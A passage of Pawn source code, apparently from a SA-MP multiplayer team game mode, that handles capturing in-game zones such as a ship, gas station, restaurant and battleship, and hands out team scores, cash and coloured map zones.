	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock ShipCaptured(playerid)
{
	Captured[playerid][SHIP] = 1;
	UnderAttack[SHIP] = 0;
	KillTimer(timer[playerid][SHIP]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][SHIP] = 25;
    GivePlayerScore(playerid, 25);
    GivePlayerMoney(playerid, 25000);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"Ship\" you received +25 scores and +$25000 cash!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][SHIP] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"Ship"cwhite"! You received +15 score for it!");
		   GivePlayerScore(i, 15);
	   }
	}
	//==========================================================================
	tCP[SHIP] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[SHIP]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[SHIP], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
       GangZoneShowForAll(Zone[SHIP], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[SHIP], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[SHIP], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[SHIP], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[SHIP], TEAM_ZONE_NEPAL_COLOR);
    }
    else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[SHIP], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"Ship\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingShip(playerid)
{
	Captured[playerid][SHIP] = 1;
	UnderAttack[SHIP] = 0;
	KillTimer(timer[playerid][SHIP]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][SHIP] = 25;
    GangZoneStopFlashForAll(Zone[SHIP]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][SHIP] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward Ship(playerid);
public Ship(playerid)
{
	ShipCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActiveGas(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[GAS] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[GAS] = 1;
			 	timer[playerid][GAS] = SetTimerEx("GasStation", 25000, false,"i",playerid);
			 	Captured[playerid][GAS] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[GAS], TEAM_ZONE_PAKISTAN_COLOR);
				}
				else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[GAS], TEAM_ZONE_DUBAI_COLOR);
			    }
				else if(gTeam[playerid] == TEAM_INDIA)
				{
			      GangZoneFlashForAll(Zone[GAS], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[GAS], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[GAS], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[GAS], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[GAS], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[GAS] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"*Gas Station is under attack!");
			    }
			    else if(tCP[GAS] == TEAM_DUBAI)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*Gas Station is under attack!");
			    }
			    else if(tCP[GAS] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*Gas Station is under attack!");
			    }
			    else if(tCP[GAS] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*Gas Station is under attack!");
				}
				else if(tCP[GAS] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Gas Station is under attack!");
				}
				else if(tCP[GAS] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Gas Station is under attack!");
				}
				else if(tCP[GAS] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_ML, green,"*Gas Station is under attack!");
				}
				else if(tCP[GAS] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][GAS] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock GasCaptured(playerid)
{
	Captured[playerid][GAS] = 1;
	UnderAttack[GAS] = 0;
	KillTimer(timer[playerid][GAS]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][GAS] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"Gas Station\" you received +5 scores and +$5000 cash!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][GAS] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"Gas Station"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[GAS] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[GAS]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[GAS], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
       GangZoneShowForAll(Zone[GAS], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[GAS], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[GAS], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[GAS], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[GAS], TEAM_ZONE_NEPAL_COLOR);
    }
    else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[GAS], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"Gas Station\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingGas(playerid)
{
	Captured[playerid][GAS] = 1;
	UnderAttack[GAS] = 0;
	KillTimer(timer[playerid][GAS]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][GAS] = 25;
    GangZoneStopFlashForAll(Zone[GAS]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][GAS] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward GasStation(playerid);
public GasStation(playerid)
{
	GasCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActiveRes(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[RES] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[RES] = 1;
			 	timer[playerid][RES] = SetTimerEx("Restaurant", 25000, false,"i",playerid);
			 	Captured[playerid][RES] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[RES], TEAM_ZONE_PAKISTAN_COLOR);
				}
				else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[RES], TEAM_ZONE_DUBAI_COLOR);
			    }
				else if(gTeam[playerid] == TEAM_INDIA)
				{
			      GangZoneFlashForAll(Zone[RES], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[RES], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[RES], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[RES], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[RES], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[RES] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"*Restaurant is under attack!");
			    }
			    else if(tCP[RES] == TEAM_DUBAI)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*Restaurant is under attack!");
			    }
			    else if(tCP[RES] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*Restaurant is under attack!");
			    }
			    else if(tCP[RES] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*Restaurant is under attack!");
				}
				else if(tCP[RES] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Restaurant is under attack!");
				}
				else if(tCP[RES] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Restaurant is under attack!");
				}
				else if(tCP[RES] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_ML, green,"*Restaurant is under attack!");
				}
				else if(tCP[RES] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][RES] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock ResCaptured(playerid)
{
	Captured[playerid][RES] = 1;
	UnderAttack[RES] = 0;
	KillTimer(timer[playerid][RES]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][RES] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"Restaurant\" you received +5 scores and +$5000 cash!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][RES] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"Restaurant"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[RES] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[RES]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[RES], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
       GangZoneShowForAll(Zone[RES], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[RES], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[RES], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[RES], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[RES], TEAM_ZONE_NEPAL_COLOR);
    }
	else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[RES], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"Restaurant\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingRes(playerid)
{
	Captured[playerid][RES] = 1;
	UnderAttack[RES] = 0;
	KillTimer(timer[playerid][RES]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][RES] = 25;
    GangZoneStopFlashForAll(Zone[RES]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][RES] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward Restaurant(playerid);
public Restaurant(playerid)
{
	ResCaptured(playerid);
	return 1;
}
//==============================================================================
/*stock ActiveNPP(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[NPP] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[NPP] = 1;
			 	timer[playerid][NPP] = SetTimerEx("NPP", 25000, false,"i",playerid);
			 	Captured[playerid][NPP] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[NPP], TEAM_ZONE_PAKISTAN_COLOR);
				}
				else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[NPP], TEAM_ZONE_DUBAI_COLOR);
			    }
				else if(gTeam[playerid] == TEAM_INDIA)
				{
			      GangZoneFlashForAll(Zone[NPP], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[NPP], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[NPP], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[NPP], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[NPP], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[NPP] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"*Nuclear Power Plant is Under Attack!");
			    }
			    else if(tCP[NPP] == TEAM_DUBAI)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*Nuclear Power Plant is Under Attack!");
			    }
			    else if(tCP[NPP] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*Nuclear Power Plant is Under Attack!");
			    }
			    else if(tCP[NPP] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*Nuclear Power Plant is Under Attack!");
				}
				else if(tCP[NPP] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Nuclear Power Plant is Under Attack!");
				}
				else if(tCP[NPP] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Nuclear Power Plant is Under Attack!");
				}
				else if(tCP[NPP] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_ML, green,"*Nuclear Power Plant is Under Attack!");
				}
				else if(tCP[NPP] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][NPP] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock NuclearCaptured(playerid)
{
	Captured[playerid][NPP] = 1;
	UnderAttack[NPP] = 0;
	KillTimer(timer[playerid][NPP]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][NPP] = 25;
    GivePlayerScore(playerid, 10);
    GivePlayerMoney(playerid, 10000);
    GivePlayerWeapon(playerid, 24, 50);
    GivePlayerWeapon(playerid, 27, 100);
    GivePlayerWeapon(playerid, 31, 300);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"Nuclear Power Plant\" you received +10 scores, +$10000 cash and extra weapon!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][NPP] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"Nuclear Power Plant"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 5);
	   }
	}
	//==========================================================================
	tCP[NPP] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[NPP]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[NPP], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
       GangZoneShowForAll(Zone[NPP], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[NPP], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[NPP], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[NPP], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[NPP], TEAM_ZONE_NEPAL_COLOR);
    }
    else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[NPP], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"Nuclear Power Plant\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingNuclear(playerid)
{
	Captured[playerid][NPP] = 1;
	UnderAttack[NPP] = 0;
	KillTimer(timer[playerid][NPP]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][NPP] = 25;
    GangZoneStopFlashForAll(Zone[NPP]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][NPP] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward Nuclear(playerid);
public Nuclear(playerid)
{
	NuclearCaptured(playerid);
	return 1;
}*/
//==============================================================================
stock ActiveBATTLESHIP(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[BATTLESHIP] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[BATTLESHIP] = 1;
			 	timer[playerid][BATTLESHIP] = SetTimerEx("BATTLESHIP", 25000, false,"i",playerid);
			 	Captured[playerid][BATTLESHIP] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[BATTLESHIP], TEAM_ZONE_PAKISTAN_COLOR);
				}
				else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[BATTLESHIP], TEAM_ZONE_DUBAI_COLOR);
			    }
				else if(gTeam[playerid] == TEAM_INDIA)
				{
			      GangZoneFlashForAll(Zone[BATTLESHIP], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[BATTLESHIP], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[BATTLESHIP], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[BATTLESHIP], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[BATTLESHIP], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[BATTLESHIP] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"*BATTLESHIP is under attack!");
			    }
			    else if(tCP[BATTLESHIP] == TEAM_DUBAI)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*BATTLESHIP is under attack!");
			    }
			    else if(tCP[BATTLESHIP] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*BATTLESHIP is under attack!");
			    }
			    else if(tCP[BATTLESHIP] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*BATTLESHIP is under attack!");
				}
				else if(tCP[BATTLESHIP] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*BATTLESHIP is under attack!");
				}
				else if(tCP[BATTLESHIP] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*BATLLESHIP is under attack!");
				}
				else if(tCP[BATTLESHIP] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_NEPAL, green,"*BATTLESHIP is under attack!");
				}
				else if(tCP[BATTLESHIP] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][BATTLESHIP] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock BattleShipCaptured(playerid)
{
	Captured[playerid][BATTLESHIP] = 1;
	UnderAttack[BATTLESHIP] = 0;
	KillTimer(timer[playerid][BATTLESHIP]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][BATTLESHIP] = 25;
    GivePlayerScore(playerid, 40);
    GivePlayerMoney(playerid, 40000);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"BATTLESHIP\" you received +40 scores and +40000 cash!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][BATTLESHIP] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"BATTLESHIP"cwhite"! You received +20 score for it!");
		   GivePlayerScore(i, 20);
	   }
	}
	//==========================================================================
	tCP[BATTLESHIP] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[BATTLESHIP]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[BATTLESHIP], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
       GangZoneShowForAll(Zone[BATTLESHIP], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[BATTLESHIP], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[BATTLESHIP], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[BATTLESHIP], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[BATTLESHIP], TEAM_ZONE_NEPAL_COLOR);
    }
    else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[BATTLESHIP], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"BATTLESHIP\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingBattleShip(playerid)
{
	Captured[playerid][BATTLESHIP] = 1;
	UnderAttack[BATTLESHIP] = 0;
	KillTimer(timer[playerid][BATTLESHIP]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][BATTLESHIP] = 25;
    GangZoneStopFlashForAll(Zone[BATTLESHIP]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][BATTLESHIP] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward BattleShip(playerid);
public BattleShip(playerid)
{
	BattleShipCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActiveMOTEL(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[MOTEL] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[MOTEL] = 1;
			 	timer[playerid][MOTEL] = SetTimerEx("MOTEL", 25000, false,"i",playerid);
			 	Captured[playerid][MOTEL] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[MOTEL], TEAM_ZONE_PAKISTAN_COLOR);
				}
				else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[MOTEL], TEAM_ZONE_DUBAI_COLOR);
			    }
				else if(gTeam[playerid] == TEAM_INDIA)
				{
